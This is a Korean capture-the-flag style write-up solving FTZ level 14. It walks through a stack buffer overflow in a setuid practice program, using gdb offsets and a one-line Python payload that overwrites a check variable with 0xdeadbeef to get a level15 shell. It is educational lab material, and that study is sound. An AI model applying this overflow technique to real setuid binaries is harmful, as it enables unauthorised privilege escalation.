# FTZ 14  
## 문제설명  
attackme 프로그램을 공격하자. attackme 소스코드는 hint에 적혀있다. 소스코드는 아래와 같다.  
~~레벨14 이후로는 mainsource의 문제를 그대로 가져왔습니다.  
버퍼 오버플로우, 포맷스트링을 학습하는데는 이 문제들이 최고의 효과를 가져다줍니다.~~ 라고 한다.  
```
#include <stdio.h>
#include <unistd.h>

main()
{
	int crap;
	int check;
	char buf[20];
	fgets(buf, 45, stdin);
	
	if(check == 0xdeadbeef)
	{
		setreuid(3095, 3095);
		system("/bin/sh");
	}
}
```  
별다른 기법은 필요없고 check 부분에 0xdeadbeef가 들어가면 권한이 상승되고 쉘을 얻을 수 있다.  
attackme 파일 소유권이 level15이기 때문에 ruid, euid가 set되면 된다!  

## 문제풀이  
### 풀이과정  
1. 스택 프레임 구조는 대략 아래와 같을 것이다.  

|ret [4]|
|:---:|
|sfp [4]|
|crap [4]|
|check [4]|
|buf [20]|

변수 선언 후 fgets 함수를 통해 표준입력(stdin) 형식으로 문자열을 받아 buf에 저장한다. 여기서 길이 체크를 45까지 하면서 입력값을 선언된 버퍼의 크기보다 초과하여 입력값을 전달할 수 있다!  

2. gdb를 통해 스택구조를 자세히 파악해보자.  
<img width="312" alt="1" src="https://user-images.githubusercontent.com/46364778/89107121-c6c9f400-d469-11ea-95ce-0aeba371d118.PNG">  

- ```<main+15> push 0x2d``` : 45를 스택에 push  
- 
- **```<main+17>: lea eax, [ebp-56]```** : 입력값 받는 위치  
- **```<main+29>: cmp DWORD PTR [ebp-16], 0xdeadbeef```** : check와 0xdeadbeef 비교. 0xdeadbeef가 하드코딩이 되어 있으므로 이 주소를 이용하여 공격이 가능  
- ```push 0xc17``` : 3095이다! 그 다음에 호출될 setreuid 함수의 인자들을 미리 push하고 있다.  
- 

사용할 메모리 공간을 0x38(56byte)크기 만큼 확보하는 것을 볼 수 있다.  
예상했던 스택프레임의 크기보다 많은 공간을 확보한다는 것은 변수와 변수 사이 혹은 변수와 sfp사이에 dummy값이 존재한다는 것을 알 수 있다.  

변수와 변수 사이 혹은 sfp와의 dummy 크기를 알아내야하지만 사실 필요없다.  
우리가 필요한 변수의 주소는 main+29 cmp문을 보면 쉽게 알 수 있다.  
[ebp-16] 주소의 값과 0xdeadbeef의 값을 비교하는 구문이다.  
따라서 ebp-16주소에 0xdeadbeef 값을 넣어주면 끝!  

check와 우리가 입력을 하는 buf 사이의 거리는  
ebp를 기준으로 buf => [ebp-56]  
ebp를 기준으로 check => [ebp-16] 이므로 40이다.  

3. 페이로드 작성  
따라서 40을 nop으로 채우고 그 이후에 0xdeadbeef를 넣어주면 된다.  
* 직접 check에 0xdeadbeef 넣기  
```
(python -c 'print "\x90"*40 + "\xef\xbe\xad\xde"'; cat) | ./attackme
```  

4. level15 권한의 쉘이 바로 뜬다. whoami로 uid확인해보자! 비밀번호를 알아내자. "guess what"  

### 외전 - dummy 완벽히 파악하기  
1. 더미 확인을 위해 distance.c라는 소스코드를 작성해보자.  
```
#include <stdio.h>
#include <unistd.h>

main() {
	int crap;
	int check;
	char buf[20];
	fgets(buf,45,stdin);
	
	if(check==0xdeadbeef){
		setreuid(3095,3095);
		system("/bin/sh");
	}
	
	printf("Input is : %s\n &buf : %p\n &check : %p\n &crap: %px\n", buf, buf, &check, &crap);
}
```  

```
./distance 후 buf에 아무 값이나 입력해라! ex.AAA

//결과
Input is : AAAA

&buf: 0xbffff420
&check: 0xbffff448
&crap: 0xbffff44c
```  

이를 통해 buf의 시작과 check의 시작은 40byte차이, check와 crap은 4byte 차이가 난다는 것을 알 수 있다.  
buf는 20byte이므로 buf와 check 사이의 더미는 20바이트  
check는 4byte이므로 check와 crap 사이의 더미는 없다, 고로 crap과 sfp 사이의 더미가 있다는 것!  
56(처음 할당받은 가용메모리) - 20(buf) - 20(dummy) - 4(check) - 4(crap) =8 남은건 8byte이므로 crap와 sfp 사이의 dummy가 8byte이다.  
(검산은 56할당받았는데 우리가 해준 변수 할당은 20+4+4=28이므로 나머지 28이 더미니까, 더미들 더하면 28, 맞네!)  

|ret [4]|
|:---:|
|sfp [4]|
|dummy [8]|
|crap [4]|
|check [4]|
|dummy [20]|
|buf [20]|


